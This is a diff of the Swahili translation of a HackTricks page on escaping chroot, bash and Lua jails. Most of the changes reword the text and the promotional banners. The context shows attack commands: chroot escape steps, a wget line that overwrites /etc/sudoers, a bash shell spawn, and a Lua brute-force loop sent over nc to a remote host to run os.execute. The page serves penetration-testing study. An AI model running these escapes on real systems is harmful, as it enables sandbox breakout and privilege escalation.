@@ -1,18 +1,19 @@
 # Kutoroka Kutoka Jela
 
+{% hint style="success" %}
+Jifunze na zoezi la AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Mafunzo ya HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Jifunze na zoezi la GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Mafunzo ya HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>
+<summary>Support HackTricks</summary>
 
-Njia nyingine za kusaidia HackTricks:
-
-* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
-* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
-* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
-* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.
+* Angalia [**mpango wa usajili**](https://github.com/sponsors/carlospolop)!
+* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Shiriki mbinu za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
 
 ## **GTFOBins**
 
@@ -20,7 +21,7 @@ Njia nyingine za kusaidia HackTricks:
 
 ## Kutoroka kwa Chroot
 
-Kutoka [wikipedia](https://en.wikipedia.org/wiki/Chroot#Limitations): Mfumo wa chroot **haukusudiwi kulinda** dhidi ya kuharibiwa kwa makusudi na watumiaji wenye **mamlaka** (**root**). Kwenye mifumo mingi, muktadha wa chroot hauwezi kustack vizuri na programu zilizochrooted **zenye mamlaka ya kutosha zinaweza kufanya chroot ya pili kuvunja**.\
+Kutoka [wikipedia](https://en.wikipedia.org/wiki/Chroot#Limitations): Mfumo wa chroot haukusudiwi kumlinda dhidi ya kuharibiwa kwa makusudi na watumiaji wenye **mamlaka** (**root**). Kwenye mifumo mingi, muktadha wa chroot hauwezi kustack vizuri na programu zilizochrooted **zenye mamlaka ya kutosha zinaweza kufanya chroot ya pili kuvunja**.\
 Kawaida hii inamaanisha kwamba ili kutoroka unahitaji kuwa root ndani ya chroot.
 
 {% hint style="success" %}
@@ -35,7 +36,7 @@ Ikiwa wewe ni **root** ndani ya chroot unaweza **kutoroka** kwa kuunda **chroot 
 Hii hutokea kwa sababu kawaida chroot HAIHAMISHI saraka yako ya kufanyia kazi kwenye ile iliyoelekezwa, hivyo unaweza kuunda chroot lakini uwe nje yake.
 {% endhint %}
 
-Kawaida hutapata binary ya `chroot` ndani ya jela ya chroot, lakini **unaweza kuchanganya, kupakia na kutekeleza** binary: 
+Kawaida hutapata binary ya `chroot` ndani ya gereza la chroot, lakini **unaweza kuiandika, kuipakia na kuitekeleza**:
 
 <details>
 
@@ -93,7 +94,7 @@ system("/bin/bash");
 ### Root + Saved fd
 
 {% hint style="warning" %}
-Hii ni sawa na kesi iliyopita, lakini katika kesi hii **mshambuliaji hifadhi file descriptor kwa saraka ya sasa** na kisha **anajenga chroot katika saraka mpya**. Hatimaye, kwa kuwa ana **upatikanaji** wa **FD** **nje** ya chroot, anapata na **kutoroka**.
+Hii ni sawa na kesi iliyopita, lakini katika kesi hii **mshambuliaji hifadhi file descriptor kwa saraka ya sasa** na kisha **anajenga chroot katika saraka mpya**. Hatimaye, akiwa na **upatikanaji** wa **FD** hiyo **nje** ya chroot, anapata na **kutoroka**.
 {% endhint %}
 
 <details>
@@ -127,8 +128,8 @@ chroot(".");
 FD inaweza kupitishwa juu ya Unix Domain Sockets, hivyo:
 
 * Unda mchakato wa mtoto (fork)
-* Unda UDS ili mzazi na mtoto waweze kuzungumza
-* Endesha chroot katika mchakato wa mtoto katika saraka tofauti
+* Unda UDS ili mzazi na mtoto waweze kuongea
+* Tekeleza chroot katika mchakato wa mtoto katika saraka tofauti
 * Katika mchakato wa mzazi, unda FD ya saraka ambayo iko nje ya chroot mpya ya mchakato wa mtoto
 * Pita kwa mtoto FD hiyo kutumia UDS
 * Mchakato wa mtoto chdir kwa FD hiyo, na kwa sababu iko nje ya chroot yake, atatoka gerezani
@@ -162,11 +163,11 @@ Hii inawezekana katika Linux
 ### ptrace
 
 {% hint style="warning" %}
-* Zamani watumiaji wangeweza kudebugi michakato yao wenyewe kutoka kwa mchakato wa wenyewe... lakini hii sio inawezekana kwa chaguo-msingi tena
+* Zamani watumiaji wangeweza kudebugi mchakato wao wenyewe kutoka kwa mchakato wa wenyewe... lakini hii sio inawezekana kwa chaguo-msingi tena
 * Hata hivyo, ikiwa inawezekana, unaweza ptrace katika mchakato na kutekeleza shellcode ndani yake ([angalia mfano huu](linux-capabilities.md#cap\_sys\_ptrace)).
 {% endhint %}
 
-## Bash Jails
+## Jela za Bash
 
 ### Uchambuzi
 
@@ -214,7 +215,7 @@ BASH_CMDS[shell]=/bin/bash;shell -i
 ```
 ### Wget
 
-Unaweza kubadilisha mfano faili ya sudoers
+Unaweza kubadilisha mfano wa faili ya sudoers
 ```bash
 wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
 ```
@@ -239,7 +240,7 @@ Mbinu za kutoroka kutoka kwa jela za python zinapatikana kwenye ukurasa ufuatao:
 
 ## Lua Jails
 
-Kwenye ukurasa huu unaweza kupata kazi za jumla unazo ufikia ndani ya lua: [https://www.gammon.com.au/scripts/doc.php?general=lua\_base](https://www.gammon.com.au/scripts/doc.php?general=lua\_base)
+Kwenye ukurasa huu unaweza kupata kazi za jumla unazoziweza ndani ya lua: [https://www.gammon.com.au/scripts/doc.php?general=lua\_base](https://www.gammon.com.au/scripts/doc.php?general=lua\_base)
 
 **Eval na utekelezaji wa amri:**
 ```bash
@@ -254,7 +255,7 @@ Panga kazi za maktaba:
 ```bash
 for k,v in pairs(string) do print(k,v) end
 ```
-Tafadhali kumbuka kila unapotekeleza amri ya mstari mmoja iliyotangulia katika **mazingira tofauti ya lua, mpangilio wa kazi hubadilika**. Kwa hivyo, ikiwa unahitaji kutekeleza kazi moja maalum unaweza kufanya shambulio la nguvu kwa kupakia mazingira tofauti ya lua na kuita kazi ya kwanza ya maktaba:
+Tafadhali kumbuka kuwa kila unapotekeleza amri ya mstari mmoja iliyotangulia katika **mazingira tofauti ya lua, mpangilio wa kazi hubadilika**. Kwa hivyo, ikiwa unahitaji kutekeleza kazi moja maalum unaweza kufanya shambulio la nguvu likisoma mazingira tofauti ya lua na kuita kazi ya kwanza ya maktaba:
 ```bash
 #In this scenario you could BF the victim that is generating a new lua environment
 #for every interaction with the following line and when you are lucky
@@ -265,24 +266,25 @@ for k,chr in pairs(string) do print(chr(0x6f,0x73,0x2e,0x65,0x78)) end
 #and "char" from string library, and the use both to execute a command
 for i in seq 1000; do echo "for k1,chr in pairs(string) do for k2,exec in pairs(os) do print(k1,k2) print(exec(chr(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))) break end break end" | nc 10.10.10.10 10006 | grep -A5 "Code: char"; done
 ```
-**Pata ganda la lua la kuingiliana**: Ikiwa uko ndani ya ganda la lua lililopunguzwa unaweza kupata ganda jipya la lua (na kwa matumaini lisilopunguzwa) kwa kuita:
+**Pata ganda la lua la kuingiliana**: Ikiwa uko ndani ya ganda la lua lililopunguzwa unaweza kupata ganda jipya la lua (na kwa matumaini lisililopunguzwa) kwa kuita:
 ```bash
 debug.debug()
 ```
 ## Marejeo
 
-* [https://www.youtube.com/watch?v=UO618TeyCWo](https://www.youtube.com/watch?v=UO618TeyCWo) (Majadiliano: [https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf](https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf))
+* [https://www.youtube.com/watch?v=UO618TeyCWo](https://www.youtube.com/watch?v=UO618TeyCWo) (Vijisehemu: [https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf](https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf))
+
+{% hint style="success" %}
+Jifunze & zoezi AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Mafunzo ya HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Jifunze & zoezi GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Mafunzo ya HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary><strong>Jifunze kuhusu udukuzi wa AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>
+<summary>Support HackTricks</summary>
 
-Njia nyingine za kusaidia HackTricks:
-
-* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA USAJILI**](https://github.com/sponsors/carlospolop)!
-* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
-* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
-* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Shiriki mbinu zako za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.
+* Angalia [**mpango wa michango**](https://github.com/sponsors/carlospolop)!
+* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Shiriki mbinu za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
